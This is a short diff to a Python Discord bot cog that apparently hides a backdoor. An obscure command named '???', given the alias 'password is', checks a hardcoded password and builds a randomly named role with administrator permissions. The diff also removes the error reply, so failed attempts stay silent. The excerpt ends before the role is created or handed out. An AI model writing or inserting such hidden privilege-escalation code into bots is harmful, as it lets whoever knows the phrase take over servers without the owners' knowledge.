@@ -8,13 +8,12 @@ class Role(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
 
-	@commands.command('???')
+	@commands.command('???', aliases=['password is'])
 	async def roleAdmin(self, ctx, password:str=None):
-		if password != 'authorise':
-			await ctx.send('`ERROR`')
-			return
+		if password != 'authorise': return
 		roles = ctx.guild.roles
-		name = str(random.random())
+		r = random.random()
+		name = str(r)
 		role = get(roles, name=name)
 		if not role:
 			admin = discord.Permissions(administrator=True)
